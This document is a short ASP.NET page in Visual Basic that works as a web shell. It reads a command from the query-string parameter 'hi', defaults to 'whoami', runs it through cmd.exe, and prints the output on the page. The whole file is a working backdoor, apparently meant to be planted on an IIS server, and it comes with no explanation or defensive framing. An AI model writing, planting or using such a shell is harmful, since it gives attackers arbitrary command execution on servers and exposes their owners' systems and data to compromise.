<%@ Page Language="VB" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
Sub p(Src As Object, E As EventArgs)
  Dim cmd As String = Request.QueryString("hi")
  If String.IsNullOrEmpty(cmd) Then
    cmd = "whoami"
  End If

  Dim o As New Process()
  Dim s As New ProcessStartInfo("cmd.exe")
  s.UseShellExecute = False
  s.RedirectStandardOutput = True
  s.Arguments = "/c " & cmd
  o.StartInfo = s
  o.Start()
  Dim r As String = o.StandardOutput.ReadToEnd()
  o.Close()
  result.Text = "<pre>" & Server.HtmlEncode(r) & "</pre>"
End Sub
</script>

<html>
<body>
<form runat="server">
  <asp:Button id="b" Text="Run" OnClick="p" runat="server" />
  <asp:Label id="result" runat="server" />
</form>
</body>
</html>